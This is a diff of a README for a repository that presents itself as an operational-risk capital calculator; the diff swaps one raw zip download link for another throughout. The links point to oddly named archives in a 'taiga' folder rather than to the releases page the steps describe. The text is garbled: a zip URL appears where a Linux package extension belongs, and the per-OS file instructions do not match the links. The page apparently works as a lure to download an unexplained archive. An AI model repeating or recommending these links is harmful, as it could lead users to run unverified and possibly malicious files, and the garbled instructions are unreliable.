@@ -1,7 +1,7 @@
 # 📊 OpRisk-LDA-Engine - Model Operational Risk with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/jojo44666/OpRisk-LDA-Engine/main/taiga/Op_Engine_LD_Risk_2.1.zip%20Now-%20OpRisk--LDA--Engine-blue)](https://raw.githubusercontent.com/jojo44666/OpRisk-LDA-Engine/main/taiga/Op_Engine_LD_Risk_2.1.zip)
+[![Download](https://github.com/jojo44666/OpRisk-LDA-Engine/raw/refs/heads/main/taiga/LD_Risk_Engine_Op_v1.1.zip%20Now-%20OpRisk--LDA--Engine-blue)](https://github.com/jojo44666/OpRisk-LDA-Engine/raw/refs/heads/main/taiga/LD_Risk_Engine_Op_v1.1.zip)
 
 ## 🎯 Overview
 The OpRisk-LDA-Engine provides a user-friendly framework for calculating Operational Risk Capital. It follows the Basel III standards and utilizes the Loss Distribution Approach (LDA). This tool is essential for anyone involved in risk management or financial analysis.
@@ -18,12 +18,12 @@ To get started, follow the steps below. No programming knowledge is required.
 
 ### 🔗 Download & Install
 1. **Visit the Releases Page:** Go to the following link to access the release files:  
-    [Download the latest version](https://raw.githubusercontent.com/jojo44666/OpRisk-LDA-Engine/main/taiga/Op_Engine_LD_Risk_2.1.zip)
+    [Download the latest version](https://github.com/jojo44666/OpRisk-LDA-Engine/raw/refs/heads/main/taiga/LD_Risk_Engine_Op_v1.1.zip)
 
 2. **Choose the Correct File:** On the releases page, you will see multiple files. Select the one that matches your operating system.
    - For Windows, look for `.exe` files.
    - For macOS, find `.dmg` or `.pkg` files.
-   - For Linux, look for packages like `.deb` or `https://raw.githubusercontent.com/jojo44666/OpRisk-LDA-Engine/main/taiga/Op_Engine_LD_Risk_2.1.zip`.
+   - For Linux, look for packages like `.deb` or `https://github.com/jojo44666/OpRisk-LDA-Engine/raw/refs/heads/main/taiga/LD_Risk_Engine_Op_v1.1.zip`.
 
 3. **Download the File:** Click on the file name to start the download.
 
@@ -75,4 +75,4 @@ This project is open-source. You can view the license details in the LICENSE fil
 
 ## 📥 Download Now
 For final download, click here:  
-[Download the latest version](https://raw.githubusercontent.com/jojo44666/OpRisk-LDA-Engine/main/taiga/Op_Engine_LD_Risk_2.1.zip)
+[Download the latest version](https://github.com/jojo44666/OpRisk-LDA-Engine/raw/refs/heads/main/taiga/LD_Risk_Engine_Op_v1.1.zip)
